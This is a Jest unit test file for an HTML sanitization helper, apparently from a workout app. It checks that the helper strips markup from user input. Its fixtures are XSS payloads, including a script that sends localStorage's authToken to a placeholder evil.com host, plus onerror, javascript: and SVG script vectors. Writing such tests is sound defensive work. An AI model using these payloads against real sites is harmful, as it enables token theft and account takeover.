import { sanitizeUserContent } from '../../../src/utils/sanitization';

describe('Sanitization Utils', () => {
  describe('sanitizeUserContent', () => {
    it('should strip script tags from input', () => {
      const malicious = '<script>alert("XSS")</script>Hello';
      const result = sanitizeUserContent(malicious);
      expect(result).toBe('Hello');
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('</script>');
    });

    it('should strip img tags with onerror handlers', () => {
      const malicious = '<img src=x onerror=alert(1)>Safe text';
      const result = sanitizeUserContent(malicious);
      expect(result).toBe('Safe text');
      expect(result).not.toContain('<img');
      expect(result).not.toContain('onerror');
    });

    it('should strip iframe tags', () => {
      const malicious = '<iframe src="https://evil.com"></iframe>Content';
      const result = sanitizeUserContent(malicious);
      expect(result).toBe('Content');
      expect(result).not.toContain('<iframe');
      expect(result).not.toContain('</iframe>');
    });

    it('should strip onclick event handlers', () => {
      const malicious = '<div onclick="alert(1)">Click me</div>';
      const result = sanitizeUserContent(malicious);
      expect(result).toBe('Click me');
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('<div');
    });

    it('should strip all HTML tags and preserve plain text', () => {
      const input = '<p>This is <strong>bold</strong> text</p>';
      const result = sanitizeUserContent(input);
      expect(result).toBe('This is bold text');
    });

    it('should handle nested HTML tags', () => {
      const input = '<div><span><script>alert("nested")</script>Text</span></div>';
      const result = sanitizeUserContent(input);
      expect(result).toBe('Text');
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
    });

    it('should handle empty strings', () => {
      const result = sanitizeUserContent('');
      expect(result).toBe('');
    });

    it('should handle null input gracefully', () => {
      const result = sanitizeUserContent(null);
      expect(result).toBe('');
    });

    it('should handle undefined input gracefully', () => {
      const result = sanitizeUserContent(undefined);
      expect(result).toBe('');
    });

    it('should preserve plain text without HTML', () => {
      const input = 'This is a normal workout name';
      const result = sanitizeUserContent(input);
      expect(result).toBe('This is a normal workout name');
    });

    it('should handle multi-line text', () => {
      const input = 'Line 1\nLine 2\nLine 3';
      const result = sanitizeUserContent(input);
      expect(result).toBe('Line 1\nLine 2\nLine 3');
    });

    it('should strip data URIs in src attributes', () => {
      const malicious = '<img src="data:text/html,<script>alert(1)</script>">';
      const result = sanitizeUserContent(malicious);
      expect(result).toBe('');
      expect(result).not.toContain('data:');
    });

    it('should strip javascript: protocol', () => {
      const malicious = '<a href="javascript:alert(1)">Click</a>';
      const result = sanitizeUserContent(malicious);
      expect(result).toBe('Click');
      expect(result).not.toContain('javascript:');
    });

    it('should handle complex XSS payload', () => {
      const malicious =
        '<script>fetch("https://evil.com/steal?token=" + localStorage.getItem("authToken"))</script>';
      const result = sanitizeUserContent(malicious);
      expect(result).toBe('');
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('fetch');
      expect(result).not.toContain('localStorage');
    });

    it('should handle HTML entities', () => {
      const input = '&lt;script&gt;alert(1)&lt;/script&gt;';
      const result = sanitizeUserContent(input);
      // HTML entities are already safe - they represent text, not executable HTML
      // sanitize-html preserves them as-is, which is correct behavior
      expect(result).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
    });

    it('should preserve special characters that are not HTML', () => {
      const input = 'Workout notes: 3 x 8-10 @ 85% 1RM';
      const result = sanitizeUserContent(input);
      expect(result).toBe('Workout notes: 3 x 8-10 @ 85% 1RM');
    });

    it('should handle style tags', () => {
      const malicious = '<style>body { display: none; }</style>Text';
      const result = sanitizeUserContent(malicious);
      expect(result).toBe('Text');
      expect(result).not.toContain('<style>');
    });

    it('should strip SVG with embedded scripts', () => {
      const malicious = '<svg><script>alert(1)</script></svg>';
      const result = sanitizeUserContent(malicious);
      expect(result).toBe('');
      expect(result).not.toContain('<svg>');
    });

    it('should handle whitespace-only strings', () => {
      const result = sanitizeUserContent('   \n\t  ');
      expect(result).toBe('   \n\t  ');
    });
  });
});
